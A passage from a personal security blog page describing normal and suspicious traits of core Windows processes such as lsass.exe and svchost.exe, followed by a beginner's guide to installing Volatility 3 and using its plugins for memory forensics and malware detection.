            <p>Any other subsystem listed in the Required value of HKLM\System\CurrentControlSet\Control\Session Manager\Subsystems is also launched.</p>
            <h5>🛡️ Security Considerations</h5>
            <p>Given its integral role, smss.exe is a target for malicious actors who may attempt to disguise malware under its name. To verify its legitimacy:​</p>
            <ul>
                <li>File Location: Ensure smss.exe resides in the C:\Windows\System32 directory.</li>
                <li>Digital Signature: Check that the file is digitally signed by Microsoft.​​</li>
            </ul>
            <p>Any deviation from these could indicate a potential security threat.</p>
            <h5>🧠 Why It Matters</h5>
            <p>Understanding smss.exe is crucial for system administrators and cybersecurity professionals. Its proper functioning ensures the stability and security of the Windows operating system. Monitoring this process can help detect anomalies and prevent potential system compromises.</p>
            <h5>What is normal?</h5>
            <img src="smss.png" alt="OSI Model Layers" style="width: 70%; max-width: 1630px; border-radius: 10px;">
            <ul>
                <li>Image Path:  %SystemRoot%\System32\smss.exe</li>
                <li>Parent Process:  System</li>
                <li>Number of Instances:  One master instance and child instance per session. The child instance exits after creating the session.​</li>
                <li>User Account:  Local System​</li>
                <li>Start Time:  Within seconds of boot time for the master instance</li>
            </ul>
            <h5>What is unusual?</h5>
            <ul>
                <li>A different parent process other than System (4)</li>
                <li>The image path is different from C:\Windows\System32</li>
                <li>More than one running process. (children self-terminate and exit after each new session)​</li>
                <li>The running User is not the SYSTEM user​</li>
                <li>Unexpected registry entries for Subsystem</li>
            </ul>
            <h4>🧠 What is <code>csrss.exe</code>?</h4>
            <p><code>csrss.exe</code>, short for <strong>Client/Server Runtime Subsystem</strong>, is one of the first and most essential user-mode processes that launches when Windows boots up. Think of it as a system-level coordinator that handles a bunch of behind-the-scenes stuff needed for the OS to run smoothly.</p>
            <p>
            It used to manage both the graphical UI and the command-line interface in early Windows, but now it’s mainly focused on:
            </p>
            <ul>
            <li>🧩 Spinning up and managing <strong>processes and threads</strong></li>
            <li>🖥️ Controlling <strong>console windows</strong> (like the Command Prompt)</li>
            <li>🛑 Helping with <strong>shutdown procedures</strong></li>
            </ul>

            <h5>🔧 What It Does Today</h5>
            <p>Modern Windows systems rely on <code>csrss.exe</code> to:</p>
            <ul>
            <li>🔹 <strong>Start New Apps</strong>: It handles the low-level stuff needed when you launch a new process.</li>
            <li>🔹 <strong>Keep Console Windows Alive</strong>: Every command-line window you open depends on <code>csrss.exe</code> to function.</li>
            <li>🔹 <strong>Support Multi-User Sessions</strong>: Each user session runs its own instance of <code>csrss.exe</code>, which helps keep things isolated and stable.</li>
            <li>🔹 <strong>Shutdown Cleanly</strong>: It helps Windows wrap everything up cleanly during system shutdown.</li>
            </ul>
            <h5>What is normal?</h5>
            <p>Session 0 (PID 392)</p>
            <img src="csrss-session0.png" alt="OSI Model Layers" style="width: 70%; max-width: 1630px; border-radius: 10px;">
            <p>Session 1 (PID 512)</p>
            <img src="csrss-session1.png" alt="OSI Model Layers" style="width: 70%; max-width: 1630px; border-radius: 10px;">
            <p>Remember, these processes are spawned by smss.exe, which self-terminates itself.</p>
            <ul>
                <li><strong>Image Path:</strong> Should be <code>C:\Windows\System32\csrss.exe</code>. If it’s somewhere else, that’s suspicious.</li>
                <li><strong>Parent Process:</strong> It’s normally started by <code>smss.exe</code>, which then exits right after.</li>
                <li><strong>Number of Instances:</strong> Usually two or more, one for Session 0 and one for Session 1, with more added as needed.</li>
                <li><strong>User Account:</strong> Runs under the <code>SYSTEM</code> account, not a regular user.</li>
                <li><strong>Start Time:</strong> The first instances start within seconds after the system boots. More might appear as new user sessions are created.</li>
              </ul>
              
              <ul>
                    <li><strong>What’s Unusual?</strong></li>
                    <li>If the parent process is something other than <code>smss.exe</code></li>
                    <li>If the file path isn’t exactly <code>C:\Windows\System32</code></li>
                    <li>If there are tiny spelling mistakes in the filename (like <code>csrsss.exe</code>) meant to trick users</li>
                    <li>If it’s running as a user other than <code>SYSTEM</code></li>
              </ul>
              <h4>🧠 Understanding <code>wininit.exe</code></h4>
                <ul>
                    <li><strong>wininit.exe</strong> stands for <em>Windows Initialization</em>.</li>
                    <li>It’s a system-level process that kicks in very early during boot, right after <code>smss.exe</code> runs and exits.</li>
                    <li>It’s responsible for starting other key processes in <strong>Session 0</strong>, including:
                </ul>

                <ul>
                    <li><code>services.exe</code> – manages all Windows services</li>
                    <li><code>lsass.exe</code> – handles local security policies and login authentication</li>
                    <li><code>lsaiso.exe</code> – only appears if <strong>Credential Guard</strong> is enabled (it protects secrets like credentials and encryption keys)</li>
                </ul>
                    <li>Once <code>wininit.exe</code> runs, it stays active in the background as part of the OS's core runtime.</li>
                </ul>
                <img src="wininit.png" alt="OSI Model Layers" style="width: 70%; max-width: 1630px; border-radius: 10px;">

                <h5>✅ What’s Considered Normal?</h5>
                <ul>
                <li><strong>Image Path:</strong> Should be <code>C:\Windows\System32\wininit.exe</code></li>
                <li><strong>Parent Process:</strong> Created by <code>smss.exe</code>, which terminates right after</li>
                <li><strong>Number of Instances:</strong> Only one should be running</li>
                <li><strong>User Account:</strong> Runs under <code>SYSTEM</code></li>
                <li><strong>Start Time:</strong> Launches just seconds after the system boots up</li>
                </ul>

                <h5>🚩 What’s Suspicious?</h5>
                <ul>
                <li>The parent process is something other than <code>smss.exe</code></li>
                <li>The file path is not exactly <code>C:\Windows\System32</code></li>
                <li>The filename is subtly misspelled (like <code>winlnit.exe</code> with an “L” instead of an “I”)</li>
                <li>Multiple instances are running</li>
                <li>It’s running under a user that is not <code>SYSTEM</code></li>
                </ul>

                <h4>🧠 What is <code>services.exe</code>?</h4>
                <ul>
                <li><strong>services.exe</strong> is the Service Control Manager, responsible for managing all Windows services on the system</li>
                <li>It is launched by <code>wininit.exe</code> during the early stages of the boot process</li>
                <li>This process handles how services are started, stopped, or configured</li>
                <li>It also loads device drivers that are set to start automatically</li>
                <li>When a user logs in successfully, it updates the Last Known Good Configuration in the registry, which helps the system recover if it fails to boot later</li>
                <li><code>services.exe</code> is the parent of several key processes such as
                    <ul>
                    <li><code>svchost.exe</code> which runs many background services</li>
                    <li><code>spoolsv.exe</code> which manages printing tasks</li>
                    <li><code>msmpeng.exe</code> which is used by Windows Defender</li>
                    <li><code>dllhost.exe</code> which manages COM and DCOM objects</li>
                    </ul>
                </li>
                </ul>

                <h5>🔧 Interacting with Services</h5>
                <ul>
                <li>Windows includes a command-line tool called <code>sc.exe</code> to manage services directly</li>
                <li>Use it to start, stop, or configure services from the terminal</li>
                <li>For example, you can run <code>sc query</code> to see a list of all services</li>
                <li>All configuration data for services is stored in the registry at <code>HKLM\System\CurrentControlSet\Services</code></li>
                </ul>

                <h5>✅ What is Normal</h5>
                <ul>
                <li>Image path should be <code>C:\Windows\System32\services.exe</code></li>
                <li>Parent process should be <code>wininit.exe</code></li>
                <li>Only one instance should be running</li>
                <li>It should be running under the <strong>SYSTEM</strong> user account</li>
                </ul>

                <h5>🚩 What is Suspicious</h5>
                <ul>
                <li>A parent process that is not <code>wininit.exe</code></li>
                <li>An image path that is not in <code>C:\Windows\System32</code></li>
                <li>Misspellings in the process name that try to mimic the real one</li>
                <li>Multiple instances of <code>services.exe</code></li>
                <li>The process not running under the <strong>SYSTEM</strong> account</li>
                </ul>

                <h4>🧠 Understanding svchost.exe (Service Host)</h4>
                <ul>
                <li><strong>🛠️ What It Is:</strong> <code>svchost.exe</code> stands for “Service Host.” It’s a key Windows process used to load and run system services. Instead of each service launching its own executable, multiple services are grouped and run together inside shared <code>svchost.exe</code> processes.</li>

                <li><strong>🧩 How Services Are Run:</strong> These services are DLL-based (not .exe files). To know which DLL is tied to which service, you can look at the registry:
                    <br><code>HKLM\SYSTEM\CurrentControlSet\Services\[ServiceName]\Parameters\ServiceDLL</code></li>

                <li><strong>🔍 Example - DCOMLaunch:</strong> If you inspect the DCOMLaunch service, you’ll find a path to its DLL in the <code>ServiceDLL</code> registry key. This is how Windows knows what to load for that service.</li>

                <li><strong>🖥️ Viewing in Process Hacker:</strong> In tools like Process Hacker, you can find a specific <code>svchost.exe</code> process (by its PID), right-click it, go to properties, and view which service and DLL it’s running. You’ll also see its command-line arguments, including the <code>-k</code> parameter.</li>

                <li><strong>🔑 The <code>-k</code> Flag:</strong> This parameter is a group name (like <code>-k DcomLaunch</code>). Windows uses this to bundle similar services under the same process, keeping the system more efficient. This grouping is controlled via the registry and is visible in the binary path.</li>

                <li><strong>📈 Windows 10+ Behavior:</strong> Starting with Windows 10 version 1703, if your system has more than 3.5 GB RAM, most services get their own dedicated <code>svchost.exe</code> process to isolate them and improve security.</li>

                <li><strong>🧪 Example - LSM:</strong> Just like DCOMLaunch, other services like LSM will also have their own <code>ServiceDLL</code> path. Each one is different and points to the correct DLL for that service.</li>

                <li><strong>🚨 Security Risks:</strong> Because <code>svchost.exe</code> is always running (and multiple copies of it), malware authors often exploit it. They might:
                    <ul>
                        <li>Name their malware <code>svchost.exe</code> or use lookalikes like <code>scvhost.exe</code></li>
                        <li>Load malicious DLLs through fake services</li>
                        <li>Hide rogue processes among the legit ones</li>
                    </ul>
                    Always be on the lookout for slight misspellings or unusual behavior.
                </li>

                <li><strong>✅ What’s Normal:</strong>
                    <ul>
                        <li><strong>Image Path:</strong> <code>%SystemRoot%\System32\svchost.exe</code></li>
                        <li><strong>Parent Process:</strong> <code>services.exe</code></li>
                        <li><strong>Instances:</strong> Many (expected)</li>
                        <li><strong>User Account:</strong> Varies – could be <code>SYSTEM</code>, <code>Network Service</code>, <code>Local Service</code>, or even the logged-in user</li>
                        <li><strong>Start Time:</strong> Right after boot for core services; more instances launch as needed</li>
                    </ul>
                    <img src="svchost.png" alt="OSI Model Layers" style="width: 50%; max-width: 1630px; border-radius: 10px;">
                </li>

                <li><strong>🚩 What’s Suspicious:</strong>
                    <ul>
                        <li>Has a parent process that isn’t <code>services.exe</code></li>
                        <li>Running from any location other than <code>C:\Windows\System32</code></li>
                        <li>Misspelled filenames like <code>svhost.exe</code> or <code>scvhost.exe</code></li>
                        <li>No <code>-k</code> parameter in its command line</li>
                    </ul>
                </li>
                </ul>


                <h4>🔐 Understanding lsass.exe (Local Security Authority Subsystem Service)</h4>
                <ul>
                <li><strong>🔒 What It Does:</strong> <code>lsass.exe</code> is a critical Windows process that handles all things related to security on your machine. It:
                    <ul>
                    <li>Authenticates users logging in</li>
                    <li>Manages password changes</li>
                    <li>Generates security tokens (used by apps to determine access rights)</li>
                    <li>Logs activity in the Windows Security Log</li>
                    </ul>
                </li>

                <li><strong>🧬 Token Creation:</strong> It builds access tokens for major components like:
                    <ul>
                    <li><strong>SAM</strong> – Security Account Manager (local user credentials)</li>
                    <li><strong>Active Directory</strong> – For domain-based credentials and permissions</li>
                    <li><strong>NETLOGON</strong> – Manages secure communication with domain controllers</li>
                    </ul>
                </li>

                <li><strong>📁 Auth Packages Location:</strong> The authentication methods it uses are listed in the registry here:<br>
                    <code>HKLM\System\CurrentControlSet\Control\Lsa</code>
                </li>

                <li><strong>🚨 Why It’s Targeted:</strong> Attackers love going after <code>lsass.exe</code> because it holds the keys to the kingdom credentials. Tools like <code>Mimikatz</code> can extract passwords or hashes from its memory. Hackers either:
                    <ul>
                    <li>Dump memory directly</li>
                    <li>Create fake processes named <code>lsass.exe</code> (or with slight misspellings like <code>lsas.exe</code>) to sneak past defenders</li>
                    </ul>
                </li>

                <li><strong>🧠 Normal Behavior:</strong>
                    <ul>
                    <li><strong>Image Path:</strong> <code>%SystemRoot%\System32\lsass.exe</code></li>
                    <li><strong>Parent Process:</strong> <code>wininit.exe</code></li>
                    <li><strong>Number of Instances:</strong> Only ONE should ever be running</li>
                    <li><strong>User Account:</strong> Runs as <code>SYSTEM</code></li>
                    <li><strong>Start Time:</strong> Just seconds after Windows boots up</li>
                    </ul>
                </li>
                <img src="lsass.png" alt="OSI Model Layers" style="width: 50%; max-width: 1630px; border-radius: 10px;">

                <li><strong>🛑 Red Flags (Unusual Signs):</strong>
                    <ul>
                    <li>Parent process isn’t <code>wininit.exe</code></li>
                    <li>Running from any location other than <code>C:\Windows\System32</code></li>
                    <li>Multiple <code>lsass.exe</code> instances</li>
                    <li>Slightly misspelled process name</li>
                    <li>Not running as SYSTEM</li>
                    </ul>
                </li>
                </ul>

                <h4>🔑 Understanding winlogon.exe (Windows Logon Process)</h4>
                <ul>
                <li><strong>🔐 What It Does:</strong> <code>winlogon.exe</code> handles the secure attention sequence. This is the key combo <strong>Control plus Alt plus Delete</strong> that users press to log into Windows. It ensures that the login screen cannot be spoofed by malware.</li>

                <li><strong>👤 User Profile Loading:</strong> Once login is successful, this process loads the user's profile. It loads <code>NTUSER.DAT</code> into <code>HKEY_CURRENT_USER</code> in the registry. After that, <code>userinit.exe</code> takes over and starts the user's shell, usually <code>explorer.exe</code>.</li>

                <li><strong>🖥️ Other Responsibilities:</strong> <code>winlogon.exe</code> also takes care of locking the screen, starting the screensaver, and monitoring session activity. If a user locks the screen or leaves it idle, this process is what kicks in.</li>

                <li><strong>🚀 How It Starts:</strong> The process is launched early in the boot sequence by <code>smss.exe</code>, which also starts <code>csrss.exe</code>. After starting these two, <code>smss.exe</code> exits, which is why most tools do not show a parent process for <code>winlogon.exe</code>.</li>

                <li><strong>🧠 Normal Behavior:</strong>
                    <ul>
                    <li><strong>Image Path:</strong> <code>%SystemRoot%\System32\winlogon.exe</code></li>
                    <li><strong>Parent Process:</strong> Technically launched by <code>smss.exe</code>, but tools may not show it</li>
                    <li><strong>Number of Instances:</strong> One or more, depending on active user sessions</li>
                    <li><strong>User Account:</strong> Runs as <code>Local System</code></li>
                    <li><strong>Start Time:</strong> First instance starts within seconds of booting, new ones can appear when users connect via Remote Desktop or use Fast User Switching</li>
                    </ul>
                </li>
                <img src="winlogon1.png" alt="OSI Model Layers" style="width: 50%; max-width: 1630px; border-radius: 10px;">

                <li><strong>🛑 Unusual Signs:</strong>
                    <ul>
                    <li>The process shows a parent other than <code>smss.exe</code> (which should exit right after launching it)</li>
                    <li>File path is not <code>C:\Windows\System32</code></li>
                    <li>Name is misspelled to blend in with legit processes</li>
                    <li>It is not running as <code>SYSTEM</code></li>
                    <li>The shell registry value points to anything other than <code>explorer.exe</code></li>
                    </ul>
                </li>
                </ul>

                <h4>🗂️ Understanding explorer.exe (Windows Explorer)</h4>
                <ul>
                <li><strong>💼 What It Does:</strong> <code>explorer.exe</code> is the process that powers the Windows graphical interface. It handles file browsing, folder windows, the Start Menu, the Taskbar, and the desktop itself. If you see your icons or open “This PC,” that’s all managed by this process.</li>

                <li><strong>🧩 How It Starts:</strong> After a user logs in, <code>winlogon.exe</code> triggers <code>userinit.exe</code>, which reads the Shell registry key located at:<br>
                <code>HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell</code><br>
                That key usually points to <code>explorer.exe</code>. <code>userinit.exe</code> then launches it and exits, so technically, <code>explorer.exe</code> has no visible parent process afterward.</li>

                <li><strong>🔗 Child Processes:</strong> <code>explorer.exe</code> often spawns many child processes like file managers, settings panels, or apps launched through the Start Menu or shortcuts.</li>

                <li><strong>🧠 Normal Behavior:</strong>
                    <ul>
                    <li><strong>Image Path:</strong> <code>%SystemRoot%\explorer.exe</code></li>
                    <li><strong>Parent Process:</strong> Created by <code>userinit.exe</code>, which exits immediately</li>
                    <li><strong>Number of Instances:</strong> One or more for each user logged in with an interactive session</li>
                    <li><strong>User Account:</strong> Matches the logged-in user</li>
                    <li><strong>Start Time:</strong> Starts when the user first logs in and their desktop environment loads</li>
                    </ul>
                </li>
                <img src="explorer.png" alt="OSI Model Layers" style="width: 50%; max-width: 1630px; border-radius: 10px;">

                <li><strong>🚨 Unusual Signs:</strong>
                    <ul>
                    <li>The process has a visible parent (should not, because <code>userinit.exe</code> exits)</li>
                    <li>File path is not <code>C:\Windows\explorer.exe</code></li>
                    <li>Running under an unknown or suspicious user account</li>
                    <li>Misspelled names like <code>exporer.exe</code> or <code>explorrer.exe</code></li>
                    <li>Unexpected outbound network activity (Explorer normally should not be making network connections)</li>
                    </ul>
                </li>
                </ul>
        </div>
    </div>

    <div id="post12" class="post" onclick="togglePost(this)">
        <h3>Learning Memory Forensics with Volatility: My First Steps</h3>
        <div class="post-content">
            <img src="volatility.png" alt="OSI Model Layers" style="width: 25%; max-width: 1630px; border-radius: 10px;">
            <h4>Installing Volatility</h4>

            <p>Volatility is written in Python, making it easy to install on Linux, Windows, and macOS. For beginners, Linux is the recommended environment due to smoother setup, but all platforms are supported.</p>

            <h4>Option 1: Pre-Packaged Executable (Windows Only)</h4>

            <p>For a fast setup on Windows, download the standalone zip from the official Volatility release page.</p>
            <ul>
            <li><a class="link" href="https://github.com/volatilityfoundation/volatility3/releases/tag/v1.0.1" target="_blank">Download Volatility v1.0.1</a></li>
            </ul>
            <p>This version includes everything you need and does not require any additional dependencies.</p>

            <h4>Option 2: Install from Source (Cross-Platform)</h4>

            <h5>Step 1: Install Required Dependencies</h5>
            <ul>
            <li>Ensure you have <code>Python 3.5.3</code> or later installed</li>
            <li>Install the required library:</li>
            <li><code>pip install pefile</code></li>
            </ul>

            <h5>Optional but Recommended Packages</h5>
            <ul>
            <li><code>pip install yara-python</code></li>
            <li><code>pip install capstone</code></li>
            <li>Or install all at once:</li>
            <li><code>pip install pefile yara-python capstone</code></li>
            </ul>

            <h5>Step 2: Clone the Repository</h5>
            <ul>
            <li><code>git clone https://github.com/volatilityfoundation/volatility3.git</code></li>
            <li><code>cd volatility3</code></li>
            </ul>

            <h5>Step 3: Test the Installation</h5>
            <ul>
            <li><code>python3 vol.py -h</code></li>
            </ul>
            <p>If the help menu appears, your installation is successful.</p>

            <h5>Extra Step for Linux and macOS</h5>
            <p>For analyzing Linux or macOS memory dumps, download the appropriate symbol tables:</p>
            <ul>
            <li><a class="link" href="https://github.com/volatilityfoundation/volatility3#symbol-tables" target="_blank">Volatility Symbol Tables</a></li>
            </ul>

            <h4>Before We Dive Into Memory Forensics…</h4>

            <p>Before learning how to analyze memory, we first need to understand how to extract it, especially from a bare-metal machine. There are multiple tools available for this purpose, including:</p>

            <ul>
            <li>FTK Imager</li>
            <li>Redline</li>
            <li>DumpIt.exe</li>
            <li>win32dd.exe / win64dd.exe</li>
            <li>Memoryze</li>
            <li>FastDump</li>
            </ul>

            <p><strong>Note:</strong> Memory extraction on a bare-metal system can take a significant amount of time, especially depending on the tool and system state.</p>

            <p>Once extracted, most tools will output a <code>.raw</code> memory image. However, not all tools follow the same format. For example, <strong>Redline</strong> does not generate a <code>.raw</code> file,it uses its own agent and session-based format. So it’s critical to familiarize yourself with the tool you're using before starting any live memory acquisition.</p>

            <h4>Extracting Memory from Virtual Machines</h4>

            <p>Grabbing memory from virtual machines is generally easier,you can often just collect the virtual memory file directly from the host’s file system. However, the format of that file depends on the virtualization platform being used:</p>

            <ul>
            <li>VMWare – <code>.vmem</code></li>
            <li>Hyper-V – <code>.bin</code></li>
            <li>Parallels – <code>.mem</code></li>
            <li>VirtualBox – <code>.sav</code></li>
            </ul>

            <p><strong>Important:</strong> Do not mix memory dumps from bare-metal and virtual machines during your analysis. The structure and format can vary significantly, which may break your tools or cause inaccurate results.</p>
            <h4>Understanding Plugin Names in Volatility 3</h4>

            <p>In previous versions of Volatility, plugins had a simple naming structure. You would just use the plugin name by itself and it would work across different OS profiles.</p>

            <p>With Volatility 3, that changes. You now need to specify the operating system before the plugin name. This is because Volatility 3 no longer uses profiles to distinguish between OS types. Each operating system has a very different memory layout, so Volatility separates plugins by OS to keep everything accurate and modular.</p>

            <p>Here is what that looks like in action:</p>

            <ul>
            <li><code>windows.info</code></li>
            <li><code>linux.pslist</code></li>
            <li><code>mac.check_syscalls</code></li>
            </ul>

            <p>The format is simple: <code>[os].[plugin]</code></p>

            <h4>Operating System Prefixes You Can Use</h4>

            <ul>
            <li><code>windows</code></li>
            <li><code>linux</code></li>
            <li><code>mac</code></li>
            </ul>

            <p>Volatility 3 includes a solid selection of built in plugins for each OS, and there are also third party plugins available if you want to extend functionality.</p>

            <h4>Identifying the Operating System from a Memory Dump</h4>

            <p>Volatility 2 comes preloaded with profiles for many versions of Windows, ranging from Windows XP to Windows 10.</p>
            
            <p>When working with memory dumps, it can be tricky to figure out what operating system the dump came from, especially if you were not the one who created it. Sometimes you are given a memory file with no context at all. That is where the <code>imageinfo</code> plugin comes in. This plugin analyzes the memory file and gives you a list of possible operating system profiles that best match the dump.</p>
            
            <p>This step is only necessary if you are using Volatility 2. Volatility 3 does not use profiles anymore, which makes things easier. Instead, you just tell Volatility 3 what operating system you are working with directly in the plugin name.</p>
            
            <p><strong>Note:</strong> The <code>imageinfo</code> plugin does not always give accurate results. It provides suggestions based on what it finds in the memory dump, but you should test a few options to be sure.</p>
            
            <h4>Getting System Information with Volatility 3</h4>
            
            <p>If you want to get details about the system that generated the memory dump in Volatility 3, you can use one of the following plugins depending on the operating system:</p>
            
            <ul>
              <li><code>windows.info</code></li>
              <li><code>linux.info</code></li>
              <li><code>mac.info</code></li>
            </ul>
            
            <p>These plugins return general information about the host system from the memory dump.</p>
            
            <p><strong>Example Command:</strong></p>
            <code>python3 vol.py -f &lt;file&gt; windows.info</code>
            
            <h4>Understanding Process and Network Plugins in Volatility</h4>

            <p>Volatility provides several plugins to help you analyze processes and network activity in memory dumps. Each plugin uses a different method, and understanding these can help detect hidden or malicious activity that may try to avoid detection.</p>

            <p>The simplest way to view active and terminated processes is by using the <code>pslist</code> plugin. This tool reads from a memory list that tracks all running tasks, similar to what you see in the task manager. It includes both active and previously closed processes along with their end times.</p>

            <code>python3 vol.py -f &lt;file&gt; windows.pslist</code>

            <p>However, some types of malware try to hide by removing themselves from this list. Rootkits often use this trick. When this happens, <code>pslist</code> will not show those hidden processes. That is where the <code>psscan</code> plugin comes in. Instead of reading a tracked list, <code>psscan</code> searches the memory for structures that look like process objects. This method helps uncover hidden tasks, though it may also include a few results that are not real processes.</p>

            <code>python3 vol.py -f &lt;file&gt; windows.psscan</code>

            <p>The <code>pstree</code> plugin is another option for viewing processes. It uses the same method as <code>pslist</code> but displays the process tree based on parent and child relationships. This structure is helpful for understanding what processes were running and how they were connected when the memory was captured.</p>

            <code>python3 vol.py -f &lt;file&gt; windows.pstree</code>

            <p>Once you understand the running processes, the next step is checking for network activity. The <code>netstat</code> plugin searches memory for any data related to active network connections at the time of the dump. It is helpful for identifying how the machine was communicating with others.</p>

            <code>python3 vol.py -f &lt;file&gt; windows.netstat</code>

            <p>That said, this plugin can be unreliable with older versions of Windows. If <code>netstat</code> fails or misses important data, you can use external tools like <code>bulk_extractor</code> to pull network artifacts or even generate a PCAP file from the memory. This method may reveal network traces that Volatility alone cannot see. Visit <a class="link" href="https://tools.kali.org/forensics/bulk-extractor" target="_blank">bulk extractor</a> for more info.</p>

            <p>Finally, the <code>dlllist</code> plugin shows all the DLLs loaded by each process at the time of capture. This information is useful when you suspect a specific malicious DLL and want to verify its presence within memory.</p>

            <code>python3 vol.py -f &lt;file&gt; windows.dlllist</code>

            <h4>Using Volatility for Threat Hunting and Detection</h4>

            <p>Volatility includes many plugins that help with detecting malware and spotting strange behavior inside a system memory image. These tools are essential for anyone looking to perform threat hunting or digital forensics.</p>

            <p>Before diving into this part, it helps to understand how attackers try to avoid being seen. Knowing about common malware tactics and evasion methods will make this process much more effective.</p>

            <p>One of the most powerful tools for spotting code injection is the <code>malfind</code> plugin. It searches memory for regions where something may have been injected into a running process. It shows the process ID, memory offset, and gives you a view of the data in Hex, Ascii, and Disassembly format. This can reveal injected executables or shellcode that do not exist as normal files on disk.</p>

            <p>This plugin looks for memory marked as executable and writable or regions with no linked file. These conditions are often signs of injected code. When <code>malfind</code> finds something suspicious, it may start with an MZ header which points to a Windows executable or contain raw shellcode that needs deeper inspection.</p>

            <code>python3 vol.py -f &lt;file&gt; windows.malfind</code>

            <p>Another powerful tool is <code>yarascan</code>. This plugin lets you scan the memory image using YARA rules. You can match patterns, strings, and conditions that signal known malware behaviors. It works by passing in a YARA rule file or writing the rules directly in the command.</p>

            <code>python3 vol.py -f &lt;file&gt; windows.yarascan</code>

            <p>There are more plugins available that focus on hunting and detection.</p>

            <h4>Advanced Memory Forensics and Evasion Techniques</h4>

            <p>When you begin to analyze advanced malware behavior in memory, things can get complex quickly. This is especially true when malware starts messing with system objects like drivers or uses techniques like function hooking. If you are not already familiar with these tricks, it can be hard to follow what is going on. Adversaries that use rootkits and similar threats often try to hide their presence deep within the system. That means as an analyst, you will need to explore things like device drivers, synchronization objects such as mutexes, and even functions that have been modified or redirected.</p>

            <p>One of the key evasion techniques to understand is hooking. Attackers can modify the way the operating system normally functions by intercepting system calls. There are five major methods used for this:</p>

            <ul>
            <li>SSDT Hooks</li>
            <li>IRP Hooks</li>
            <li>IAT Hooks</li>
            <li>EAT Hooks</li>
            <li>Inline Hooks</li>
            </ul>

            <p> SSDT hooking. It is one of the more common techniques used by malware and is relatively easy to check with the built-in plugins Volatility provides.</p>

            <p>The <code>ssdt</code> plugin looks for signs of hooking inside the System Service Descriptor Table. This table is what the Windows kernel uses to keep track of core system functions. If a rootkit is active, it might change this table to point some functions to its own code instead of the real system functions. While some software may use hooking for legitimate reasons, it is your job as an analyst to determine what is normal and what is not.</p>

            <code>python3 vol.py -f &lt;file&gt; windows.ssdt</code>

            <p>Malware also hides itself using kernel drivers. There are two plugins in Volatility that can help detect malicious drivers.</p>

            <p>The <code>modules</code> plugin lists all kernel modules that were loaded when the memory was captured. This is useful for spotting known malware or suspicious drivers. But if the file is inactive or hidden, this plugin might not catch it.</p>

            <code>python3 vol.py -f &lt;file&gt; windows.modules</code>

            <p>The <code>driverscan</code> plugin scans the memory for any drivers present at the time the memory image was taken. It can catch drivers that the <code>modules</code> plugin might have missed. Use this after doing a basic investigation with the modules plugin to dig deeper.</p>

            <code>python3 vol.py -f &lt;file&gt; windows.driverscan</code>

            <p>Sometimes <code>driverscan</code> will not return anything. But if you do not see useful results with the modules plugin, it is worth a try.</p>

            <p>Here are more plugins that can help when searching for advanced threats inside memory:</p>

            <ul>
            <li>modscan</li>
            <li>driverirp</li>
            <li>callbacks</li>
            <li>idt</li>
            <li>apihooks</li>
            <li>moddump</li>
            <li>handles</li>
            </ul>

            <p>Keep in mind that some of these plugins only work with Volatility two or need to be installed from other sources. To really get the most out of Volatility, you might need to explore custom or third-party plugins.</p>







                
        </div>
    </div>

    <script>
        function togglePost(post) {
            // Don't re-toggle if it's already expanded
            if (post.classList.contains("expanded")) return;
    
            let allPosts = document.querySelectorAll(".post");
    
            allPosts.forEach(p => {
                p.classList.remove("expanded");
            });
    
            post.classList.add("expanded");
        }
    
        function closePost(event, closeButton) {
            event.stopPropagation();
            let post = closeButton.parentElement;
            post.classList.remove("expanded");
        }
    
        function handleHashToggle() {
            const hash = window.location.hash;
            if (hash) {
                const targetPost = document.querySelector(hash);
                if (targetPost && targetPost.classList.contains("post")) {
                    togglePost(targetPost);
                    targetPost.scrollIntoView({ behavior: "smooth", block: "start" });
                }
            }
        }
    
        // When page fully loads (covers all DOM + assets)
        window.addEventListener('load', () => {
            handleHashToggle();
    
            // Prevent inner content from collapsing the post
            document.querySelectorAll(".post-content").forEach(content => {
                content.addEventListener("click", event => {
                    event.stopPropagation();
                });
            });
        });
    
        // Listen to hash changes (e.g., clicking internal links or back/forward navigation)
        window.addEventListener('hashchange', handleHashToggle);
    </script>
    

</body>
</html>
